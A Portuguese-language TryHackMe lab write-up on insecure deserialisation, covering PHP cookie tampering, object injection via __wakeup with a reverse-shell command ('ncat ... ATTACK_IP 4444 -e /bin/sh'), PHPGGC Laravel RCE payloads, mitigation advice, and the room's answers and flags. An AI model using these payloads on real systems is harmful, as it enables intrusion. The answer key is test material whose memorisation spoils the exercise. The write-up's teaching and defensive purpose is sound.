# Deserialização insegura

## 📊 Info  
- Dificuldade: Média  
- Categoria: Web Security / Insecure Deserialisation  
- Data: 11/08/2026  
- Link: `https://tryhackme.com/room/insecuredeserialisation`    

## 🔍 Resumo  
Obtendo conhecimento aprofundado sobre o processo de desserialização, como ele funciona, os riscos que representa para aplicações web e as técnicas de exploração e mitigação associadas a essa vulnerabilidade crítica.

### 🔵 **Task 1: Introdução**

O foco desta tarefa é apresentar o conceito de Desserialização Insegura (Insecure Deserialisation), contextualizando-a como uma das vulnerabilidades mais perigosas, porém menos compreendidas, associadas à entrada de dados fornecida pelo usuário.

  
**Definição de Desserialização Insegura:** Ocorre quando uma aplicação confia em dados serializados e os utiliza sem validar sua autenticidade ou integridade.  

**Riscos e Impactos:** A manipulação de objetos serializados por atacantes pode levar a consequências desastrosas, como Execução Remota de Código (RCE), escalonamento de privilégios ou ataques de Negação de Serviço (DoS).  
**Ambientes Comuns:** Essa vulnerabilidade é prevalente em aplicações que serializam e desserializam estruturas de dados complexas em linguagens como Java, .NET e PHP, frequentemente usadas para chamadas de procedimento remoto (RPC), gerenciamento de sessão, etc.  
**Objetivos de Aprendizado:** Compreender o processo de serialização/desserialização, os riscos potenciais, as técnicas de exploração e as medidas de mitigação.  
**Pré-requisitos:** Conhecimento básico em "How Websites Work", "Protocols and Servers" e "OWASP Top 10".

### 🔵 **Task 2: Alguns Conceitos Importantes**

Estabelecendo uma base sólida sobre os processos de serialização e desserialização, utilizando analogias do mundo real e exemplos de código para ilustrar como os dados são transformados, armazenados e reconstruídos, além de destacar incidentes históricos que demonstram o impacto crítico dessa vulnerabilidade.

  
**Serialização:** O processo de transformar o estado de um objeto em um formato legível por humanos ou binário (ou uma mistura de ambos) para que possa ser armazenado ou transmitido. Em PHP, isso é feito usando a função `serialize()`.  
**Desserialização:** O processo inverso, onde os dados formatados são convertidos de volta em um objeto utilizável pela aplicação. É crucial para recuperar dados de arquivos, bancos de dados ou através de redes.  
**Riscos de Segurança:** Se uma aplicação desserializa dados fornecidos pelo usuário sem validar sua autenticidade, um atacante pode manipular o objeto serializado para executar ações não autorizadas.  
**Incidentes Históricos Notáveis:**  
- **Log4Shell (CVE-2021-44228):** Falha crítica no Apache Log4j que permitia execução remota de código (RCE) através de desserialização insegura.  
- **Oracle WebLogic Server (CVE-2015-4852):** Vulnerabilidade no protocolo T3 que permitia RCE ao enviar objetos maliciosamente construídos para o servidor.  
- **Jenkins (CVE-2016-0792):** Vulnerabilidade na CLI do Jenkins que permitia a execução arbitrária de código através de payloads de serialização Java.

- **Pergunta:** Qual é a função usada no PHP para serialização?  
**Resposta:** 'serialize()'  
***Nota: Conforme demonstrado no exemplo de código PHP da tarefa, a função nativa `serialize()` é utilizada para converter um array ou objeto em uma string formatada para armazenamento.*** 

- **Pergunta:** Qual é a pontuação base da vulnerabilidade CVE-2015-4852?  
**Resposta:** '7.5'  
***Nota: A vulnerabilidade de desserialização Java no Oracle WebLogic Server (CVE-2015-4852) possui uma pontuação base de severidade de 7.5, refletindo seu alto impacto e facilidade de exploração.*** 

- **Pergunta:** A serialização permite apenas salvar em um arquivo de fluxo de bytes? (yay/nay)  
**Resposta:** 'nay'  
***Nota: A serialização não se limita a salvar em arquivos de fluxo de bytes; os dados serializados podem ser transmitidos através de redes, armazenados em bancos de dados, cookies de sessão ou qualquer outro meio que suporte formatos de texto ou binários.***

### 🔵 **Task 4: Identificação**

Ensinar como identificar vulnerabilidades de desserialização insegura em aplicações web, tanto em cenários de caixa branca (com acesso ao código-fonte) quanto em caixa preta (apenas com observação externa).

**Análise de Código-Fonte (White-Box):** Procurar diretamente por funções de desserialização (como `unserialize()`, `pickle.loads()`) e verificar se a entrada do usuário é passada para elas sem validação ou sanitização adequada.  
**Teste de Caixa Preta (Black-Box):** Deduzir o uso de serialização observando padrões externos, como:  
- **Mensagens de Erro:** Erros que mencionam "unserialize" ou "Object deserialisation error".  
- **Comportamento Inconsistente:** Respostas inesperadas ao manipular cookies ou dados POST.  
- **Análise de Cookies:** Cookies com valores codificados em Base64 que, ao serem decodificados, revelam estruturas de objetos serializados (comum em PHP e .NET, como o campo `__VIEWSTATE`).  
- **Arquivos de Backup:** Técnicas como adicionar um til (`~`) ao final de nomes de arquivos PHP para tentar acessar cópias de backup geradas por editores de texto, que podem conter o código-fonte vulnerável.

- **Pergunta:** Acesse o URL http://MACHINE_IP/who/index.php e identifique qual é a função definida pelo usuário utilizada para a serialização?  
**Resposta:** 'HelloTHMSerialization'  
***Nota: Ao acessar a URL fornecida na máquina virtual e analisar o código ou os arquivos de backup (como `index.php~`), é possível identificar que a função personalizada definida pelo desenvolvedor para realizar a serialização é `HelloTHMSerialization`.***

### 🔵 **Task 5: Exploração - Atualizar propriedades**

O foco desta tarefa é demonstrar como explorar a desserialização insegura manipulando as propriedades de um objeto serializado armazenado em um cookie, permitindo o bypass de verificações de autorização (como status de assinatura) do lado do servidor.

Conceitos explorados:  
**Armazenamento de Estado em Cookies:** A aplicação armazena dados sensíveis do usuário (nome, papel, status de assinatura) em um cookie serializado em PHP e, em seguida, codificado em Base64.  
**Análise e Decodificação:** O atacante intercepta o cookie, decodifica o Base64 e analisa a string serializada resultante (ex: `O:5:"Notes":3:{s:4:"user";s:5:"guest";s:4:"role";s:5:"guest";s:12:"isSubscribed";b:0;}`).  
**Manipulação de Propriedades:** O atacante identifica a propriedade que controla o acesso (`isSubscribed`) e altera seu valor. Neste caso, mudando o booleano de falso (`b:0`) para verdadeiro (`b:1`).  
**Re-encodificação e Injeção:** A string serializada modificada é codificada novamente em Base64 e inserida de volta no cookie. Quando o servidor desserializa o cookie, ele confia cegamente no valor modificado, concedendo acesso não autorizado a funcionalidades restritas (como o recurso de compartilhar notas).

- **Pergunta:** Qual é o valor do sinalizador após compartilhar uma nota com uma assinatura válida?  
**Resposta:** 'THM{10101}'  
***Nota: Ao modificar o cookie para alterar o valor de `isSubscribed` para `b:1` (verdadeiro) e tentar compartilhar uma nota, a aplicação aceita a ação e exibe a flag de sucesso.*** 

- **Pergunta:** Qual é o valor padrão da função assim que o usuário abre o aplicativo de notas?  
**Resposta:** 'guest'  
***Nota: Conforme demonstrado na string serializada do cookie padrão (`s:4:"role";s:5:"guest"`), o papel (role) atribuído a um usuário ao carregar a aplicação pela primeira vez é "guest".***

### 🔵 **Task 6: Injeção de objetos**

O foco desta tarefa é demonstrar como explorar a Injeção de Objetos PHP (PHP Object Injection), uma vulnerabilidade que permite a execução remota de código (RCE) através da manipulação de dados desserializados, aproveitando métodos mágicos como `__wakeup()` ou `__destruct()`.

**Mecanismo de Injeção de Objetos:** Ocorre quando uma aplicação chama `unserialize()` em dados controlados pelo atacante. Se uma classe com métodos mágicos (como `__wakeup()`, que é executado automaticamente ao desserializar o objeto) estiver disponível no escopo, o atacante pode instanciar essa classe e definir suas propriedades para valores maliciosos.  
**Criação do Payload:** O atacante escreve um script PHP local que define a classe alvo (ex: `MaliciousUserData`), define a propriedade desejada (ex: `$command = 'ncat -nv ATTACK_IP 4444 -e /bin/sh'`), serializa o objeto e o codifica em Base64.  
**Exploração:** O payload codificado é enviado para o parâmetro vulnerável da aplicação (ex: `?decode=[SHELLCODE]`). Ao desserializar, o PHP recria o objeto e executa o método `__wakeup()`, que por sua vez executa o comando definido na propriedade `$command`, estabelecendo uma reverse shell para o atacante.  
**Impacto:** A execução bem-sucedida concede ao atacante acesso direto ao sistema subjacente, geralmente com os privilégios do usuário que executa o servidor web (ex: `www-data`).

- **Pergunta:** Qual é o valor do flag após obter o reverse shell?  
**Resposta:** 'THM{GOT_THE_SH#LL}'  
***Nota: Ao enviar o payload de reverse shell crafted e estabelecer a conexão com o listener Netcat, o sistema exibe a flag de sucesso, confirmando a execução remota de código.*** 

- **Pergunta:** Qual é a saída do comando `whoami` depois de acessar o shell?  
**Resposta:** 'www-data'  
***Nota: Como a vulnerabilidade reside em uma aplicação web PHP, o processo filho (a reverse shell) é executado com os privilégios do usuário do servidor web, que no Linux é tipicamente `www-data`.***

### 🔵 **Task 7: Scripts de automação**

O foco desta tarefa é demonstrar como ferramentas de automação, como o PHPGGC (PHP Gadget Chain), simplificam e agilizam a exploração de vulnerabilidades de desserialização insegura em aplicações PHP, especialmente em frameworks complexos como Laravel, CakePHP e CodeIgniter.

**PHP Gadget Chain (PHPGGC):** Uma ferramenta equivalente ao `ysoserial` do mundo Java, projetada para gerar cadeias de gadgets (gadget chains) em PHP. Essas cadeias são sequências de objetos e chamadas de métodos que, quando desserializados, exploram métodos mágicos (como `__destruct` ou `__toString`) para alcançar objetivos como Execução Remota de Código (RCE).  
**Exploração em Frameworks (Ex: Laravel):** A exploração de desserialização em frameworks modernos geralmente requer etapas adicionais, como:  
1. Obter a `APP_KEY` do framework (usada para criptografar tokens).  
2. Gerar o payload serializado com o PHPGGC (ex: `php phpggc -b Laravel/RCE3 system whoami`).  
3. Criptografar o payload usando a `APP_KEY` e enviá-lo no cabeçalho ou cookie apropriado (ex: `X-XSRF-TOKEN`).  
**Especificidade de Frameworks:** Cadeias de gadgets são altamente específicas. Um payload que explora o contêiner de serviços do Laravel não funcionará no WordPress ou Yii, pois as classes e a arquitetura interna são diferentes.

- **Pergunta:** Qual é a abordagem para explorar o CodeIgniter 4/FR1, de acordo com o PHPGGC?  
**Resposta:** '__toString'  
***Nota: Conforme listado na saída do comando `php phpggc -l`, a cadeia de gadgets `CodeIgniter4/FR1` (usada para leitura de arquivos) utiliza o método mágico `__toString` como vetor de acionamento.*** 

- **Pergunta:** Qual é o resultado do comando `whoami` na aplicação Laravel vulnerável?  
**Resposta:** 'root'  
***Nota: Ao gerar e enviar o payload com o comando `whoami` através da cadeia de gadgets do Laravel, a resposta da aplicação revela que o processo está sendo executado com privilégios de `root`.*** 

- **Pergunta:** Qual é o resultado do comando `uname -r` na aplicação Laravel vulnerável?  
**Resposta:** '5.15.0-1075-aws'  
***Nota: Ao substituir o comando no payload do PHPGGC para `uname -r` e enviá-lo criptografado, a aplicação retorna a versão do kernel do sistema operacional. *Nota: Writeups mais antigos podem mostrar `5.4.0-1029-aws`, mas a máquina virtual foi atualizada, e a resposta correta atual é `5.15.0-1075-aws`.***

### 🔵 **Task 8: Medidas de mitigação**

Discutir as melhores práticas e estratégias de mitigação para prevenir vulnerabilidades de desserialização insegura, abordando o tema sob duas perspectivas fundamentais: a do Red Team/Pentester (identificação e teste) e a do Desenvolvedor Seguro (prevenção e codificação defensiva).

**Perspectiva do Pentester (Red Team):**  
- **Análise de Código:** Revisão abrangente dos mecanismos de serialização/desserialização no código-fonte.  
- **Identificação de Vulnerabilidades:** Uso de ferramentas de análise estática (SAST) para detectar validação inadequada de entrada ou dependências desatualizadas.  
- **Fuzzing e Análise Dinâmica:** Envio de dados inesperados ou malformados para observar o comportamento da aplicação em tempo de execução.  
- **Avaliação de Tratamento de Erros:** Verificar se mensagens de erro ou stack traces vazam informações sensíveis sobre o processo de desserialização.  

**Perspectiva do Desenvolvedor Seguro (Secure Coder):**  
- **Evitar Formatos Inseguros:** Preferir formatos de troca de dados seguros e amplamente validados, como JSON ou XML, em vez de serialização nativa de objetos (como Java Serialization ou PHP `unserialize` com dados não confiáveis).  
- **Evitar `eval()` e `exec()`:** Nunca utilizar funções que executam código arbitrário a partir de strings, pois elas representam um risco crítico de Execução Remota de Código (RCE).  
- **Validação de Entrada e Codificação de Saída:** Implementar validação rigorosa (allowlisting) e sanitizar dados antes de qualquer processo de serialização ou renderização.  
- **Práticas de Codificação Segura:** Seguir princípios como o do menor privilégio, defesa em profundidade e padrões seguros específicos da linguagem ou framework.

- **Pergunta:** É uma boa prática usar a função eval() sem critério no seu código? (yay/nay)   
**Resposta:** 'nay'  
***Nota: O uso cego da função `eval()` é extremamente perigoso, pois ela executa qualquer código PHP passado como string. Se um atacante conseguir controlar essa string (por exemplo, através de um objeto desserializado), ele poderá executar comandos arbitrários no servidor.***

### 🔵 **Task 9: Conclusão**

Recapitular.

**Revisão do Fluxo de Aprendizado:**  
1. **Fundamentos:** Compreensão dos processos de serialização e desserialização e por que a confiança cega nesses dados é perigosa.  
2. **Formatos:** Análise de como diferentes linguagens (PHP, Python, Java, .NET, Ruby) implementam a serialização.  
3. **Identificação:** Técnicas para detectar a vulnerabilidade em testes de caixa branca (análise de código) e caixa preta (observação de cookies, erros e comportamento).  
4. **Exploração:** Prática de ataques como atualização de propriedades (bypass de lógica de negócio) e injeção de objetos (exploração de métodos mágicos para RCE).  
5. **Mitigação e Automação:** Implementação de defesas robustas (validação, uso de JSON/XML, evitar `eval`) e uso de ferramentas como PHPGGC para agilizar testes de segurança em frameworks.  
